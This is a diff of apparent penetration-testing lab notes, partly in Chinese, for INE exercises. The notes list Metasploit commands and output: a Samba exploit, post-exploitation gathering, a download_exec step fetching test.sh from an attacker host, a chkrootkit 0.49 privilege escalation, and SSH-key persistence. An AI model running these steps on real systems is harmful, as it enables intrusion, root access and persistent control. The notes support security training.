@@ -13,34 +13,38 @@
 		check
 	[+] 192.49.88.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
 	[*] 192.49.88.3:445 - The target appears to be vulnerable.
+ 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		run
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/multi/manage/shell_to_meterpreter
 		set SESSION 2
 		run
 		[*] Meterpreter session 2 opened (192.21.142.2:4433 -> 192.21.142.3:57508) 
-	sessions 3
-	meterpreter >
+	  	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions 3
+		meterpreter >
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/linux/gather/enum_configs
 		set SESSION 2
-	[[+] shells (/etc/shells: valid login shells)
-	[+] sepermit.conf (/etc/security/sepermit.conf)
-	[+] ca-certificates.conf (/etc/ssl/certs)
-	[+] access.conf Login access control table
-	[+] rpc stored in 
-	[+] ldap.conf 
-	[+] sysctl.conf
+  
+		[[+] shells (/etc/shells: valid login shells)
+		[+] sepermit.conf (/etc/security/sepermit.conf)
+		[+] ca-certificates.conf (/etc/ssl/certs)
+		[+] access.conf Login access control table
+		[+] rpc stored in 
+		[+] ldap.conf 
+		[+] sysctl.conf
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/multi/gather/env
 		set SESSION 2
 		run
-
-	PWD=/tmp
+  
+		PWD=/tmp
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/linux/gather/enum_network
 		set SESSION 2
 		run
+  
 	[+] DNS config 
 	nameserver 127.0.0.11
 	search members.linode.com
@@ -63,7 +67,6 @@
 	[+] iptables found: /sbin/iptables
 	[+] tcpdump found: /usr/sbin/tcpdump
 	[+] wireshark found: /usr/bin/wireshark
-
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/linux/gather/enum_system
@@ -117,18 +120,18 @@
 		useradd hacker
 		useradd test
 		useradd nick
-
-	/etc/init.d/apache2 start
-	cp test.sh /var/www/html
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		/etc/init.d/apache2 start
+		cp test.sh /var/www/html
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/linux/manage/download_exec
 		set SESSION 2
 		set URL http://192.49.88.2/test.sh
 		run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	(prove)
-	sessions -i 2
-	cat /etc/passwd
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		(prove)
+		sessions -i 2
+		cat /etc/passwd
 
 ## Privilege Escalation-Rootkit Scanner
 	=> vulnerable Rootkit Scanner
@@ -144,22 +147,23 @@
 		set USERNAME jackie
 		set PASSWORD password
 		exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	sessions -i 1 
-	[*] Starting interaction with 1...
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions -i 1 
+		[*] Starting interaction with 1...
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	檢查正在運行的服務 : 
-	ps aux
-	root          37  0.0  0.0   9924  2304 ?        S    06:20   0:00 /bin/bash /bin/check-down
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	研究檢查 bash 腳本
-	cat /bin/check-down
-	#!/bin/bash
-	while :
-	do
-		/usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
-		sleep 60
-	done
+		ps aux
+		root          37  0.0  0.0   9924  2304 ?        S    06:20   0:00 /bin/bash /bin/check-down
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		研究檢查 bash 腳本
+		cat /bin/check-down
+	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		#!/bin/bash
+		while :
+		do
+			/usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
+			sleep 60
+		done
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	檢查 chkrootkit 位置及其版本
 		command -v chkrootkit
@@ -167,22 +171,22 @@
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		/bin/chkrootkit -V
 		chkrootkit version 0.49
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	searchsploit chkrootkit 0.49
-		Chkrootkit - Local Privilege Escalation (Metasploit)       
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	search Chkrootkit - Local Privilege Escalation 
-		use exploit/unix/local/chkrootkit
-		set CHKROOTKIT /bin/chkrootkit
-		set session 1
-		set LHOST 192.237.219.2
-		exploit
-		meterpreter > cat /root/flag
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		searchsploit chkrootkit 0.49
+			Chkrootkit - Local Privilege Escalation (Metasploit)       
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		search Chkrootkit - Local Privilege Escalation 
+			use exploit/unix/local/chkrootkit
+			set CHKROOTKIT /bin/chkrootkit
+			set session 1
+			set LHOST 192.237.219.2
+			exploit
+			meterpreter > cat /root/flag
 ## Post Exploitation Lab II
 	nmap -sV -sC demo.ine.local
 		139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 		445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q 
 		search linux samba
 		use exploit/linux/samba/is_known_pipename
@@ -260,7 +264,7 @@
 ## Establishing Persistence On Linux
 	建立持久存取
 	| Username | Password | | jackie | password |
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -270,9 +274,9 @@
 		set USERNAME jackie
 		set PASSWORD password
 		exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	shell 
-	command -v chkrootkit
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		shell 
+		command -v chkrootkit
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	upgrade this command shell session to a meterpreter session !!!!!!!!!!!
 		=> sessions -u 1
@@ -283,9 +287,9 @@
 		set CHKROOTKIT /bin/chkrootkit
 		set LHOST 192.128.97.2
 		exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > ctrl z 
-	sessions -u 3
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > ctrl z 
+		sessions -u 3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	建立持久性: 
 	=> 將在所有使用者和服務帳戶主目錄下的authorized_keys檔案中新增SSH公鑰
